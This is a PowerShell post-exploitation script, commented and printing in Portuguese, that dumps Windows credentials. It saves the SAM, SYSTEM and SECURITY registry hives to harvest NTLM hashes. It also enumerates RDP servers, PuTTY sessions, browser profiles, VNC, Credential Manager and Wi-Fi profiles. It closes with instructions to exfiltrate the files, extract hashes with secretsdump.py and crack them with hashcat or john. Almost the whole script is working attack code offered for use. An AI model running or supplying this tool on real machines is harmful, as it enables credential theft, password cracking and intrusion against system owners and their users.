#Requires -Version 5.1
#Requires -RunAsAdministrator

<#
.SYNOPSIS
Registry Dumping - Extrai dados sensíveis do Windows Registry

.DESCRIPTION
Extrai: SAM, SYSTEM, SECURITY, RDP settings, Chrome passwords, etc.

.PARAMETER FullDump
Extrai tudo (lento)

.PARAMETER SAM
Extrai SAM (hashes NTLM)

.PARAMETER RDP
Extrai configurações RDP

.PARAMETER Browsers
Extrai dados de browsers

.EXAMPLE
.\registry-dump.ps1 -SAM
.\registry-dump.ps1 -FullDump
#>

param(
    [switch]$SAM,
    [switch]$SYSTEM,
    [switch]$SECURITY,
    [switch]$RDP,
    [switch]$Browsers,
    [switch]$FullDump,
    [string]$OutputPath = "C:\Temp\registry_dump"
)

$ErrorActionPreference = "SilentlyContinue"

function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "[!] Este script requer privilégios de administrador" -ForegroundColor Red
    exit
}

# Criar diretório de saída
if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath | Out-Null
}

Write-Host "[*] Despejando registro do Windows..."
Write-Host "[*] Saída: $OutputPath`n"

# === DUMP SAM ===
if ($SAM -or $FullDump) {
    Write-Host "[*] Despejando SAM (hashes NTLM)..." -ForegroundColor Cyan

    try {
        # Copiar arquivos de registro
        cmd /c "reg save HKLM\SAM $OutputPath\SAM" 2>&1 | Out-Null
        cmd /c "reg save HKLM\SYSTEM $OutputPath\SYSTEM" 2>&1 | Out-Null
        cmd /c "reg save HKLM\SECURITY $OutputPath\SECURITY" 2>&1 | Out-Null

        Write-Host "  [+] Arquivos de registro salvos" -ForegroundColor Green
        Write-Host "  [!] Próximo passo: secretsdump.py -sam SAM -system SYSTEM -security SECURITY"
    }
    catch {
        Write-Host "  [!] Erro: $_" -ForegroundColor Red
    }
}

# === RDP ===
if ($RDP -or $FullDump) {
    Write-Host "`n[*] Analisando RDP..." -ForegroundColor Cyan

    # Servidores RDP conhecidos
    $rdpReg = "HKCU:\Software\Microsoft\Terminal Server Client\Default"
    if (Test-Path $rdpReg) {
        Write-Host "  [+] Servidores RDP recentes:" -ForegroundColor Green
        Get-ItemProperty -Path $rdpReg -ErrorAction SilentlyContinue | ForEach-Object {
            $_.PSObject.Properties | Where-Object {$_.Name -notmatch "PS"} | ForEach-Object {
                Write-Host "    • $($_.Value)"
            }
        }
    }

    # Credenciais RDP
    $rdpCreds = "HKCU:\Software\Microsoft\Remote Desktop Connection Manager"
    if (Test-Path $rdpCreds) {
        Write-Host "  [!] Encontrado RDP Connection Manager (verificar credenciais)"
    }
}

# === BROWSERS ===
if ($Browsers -or $FullDump) {
    Write-Host "`n[*] Analisando Browsers..." -ForegroundColor Cyan

    # Chrome
    $chromeProfile = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default"
    if (Test-Path $chromeProfile) {
        Write-Host "  [+] Google Chrome detectado" -ForegroundColor Green
        Write-Host "    • Dados em: $chromeProfile"
        Write-Host "    • Credenciais: Encrypted (ProtectedData)"
    }

    # Firefox
    $firefoxProfile = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxProfile) {
        Write-Host "  [+] Mozilla Firefox detectado" -ForegroundColor Green
        Get-ChildItem $firefoxProfile | ForEach-Object {
            Write-Host "    • $($_.Name)"
        }
    }

    # Edge
    $edgeProfile = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default"
    if (Test-Path $edgeProfile) {
        Write-Host "  [+] Microsoft Edge detectado" -ForegroundColor Green
        Write-Host "    • Dados em: $edgeProfile"
    }
}

# === APLICATIVOS ===
if ($FullDump) {
    Write-Host "`n[*] Analisando Aplicativos..." -ForegroundColor Cyan

    # Putty
    $puttyReg = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
    if (Test-Path $puttyReg) {
        Write-Host "  [+] PuTTY sessões:" -ForegroundColor Green
        Get-ChildItem $puttyReg | ForEach-Object {
            $hostName = Get-ItemProperty -Path $_.PSPath -Name "HostName" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty HostName
            if ($hostName) {
                Write-Host "    • $($_.PSChildName) -> $hostName"
            }
        }
    }

    # VNC
    $vncReg = "HKCU:\Software\ORL\WinVNC3"
    if (Test-Path $vncReg) {
        Write-Host "  [+] VNC configurado" -ForegroundColor Green
    }

    # Credenciais
    $credReg = "HKCU:\Software\Microsoft\Credential Manager\Local VAULT"
    if (Test-Path $credReg) {
        Write-Host "  [+] Windows Credential Manager (credenciais armazenadas)"
    }
}

# === INSTALADO PROGRAMAS ===
Write-Host "`n[*] Programas instalados..." -ForegroundColor Cyan
$uninstall = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName
Write-Host "  [+] $($uninstall.Count) programas instalados" -ForegroundColor Green

# === NETWORK ===
Write-Host "`n[*] Configurações de rede..." -ForegroundColor Cyan
$wifiProfiles = netsh wlan show profiles 2>$null | Select-String "Profile Name"
if ($wifiProfiles) {
    Write-Host "  [+] Redes Wi-Fi conhecidas:" -ForegroundColor Green
    $wifiProfiles | ForEach-Object {
        $profile = $_ -replace ".*: " | Trim
        Write-Host "    • $profile"
    }
}

# === RELATÓRIO ===
Write-Host "`n$('='*60)" -ForegroundColor Cyan
Write-Host "[+] Despejo completo!" -ForegroundColor Green
Write-Host "[+] Saída: $OutputPath" -ForegroundColor Green

Write-Host "`n[!] Próximos passos:" -ForegroundColor Yellow
Write-Host "  1. Exfiltrar arquivos de $OutputPath"
Write-Host "  2. Usar secretsdump.py para extrair hashes do SAM"
Write-Host "  3. Crack hashes com hashcat/john"
Write-Host "  4. Verificar RDP, putty, VNC para credenciais"
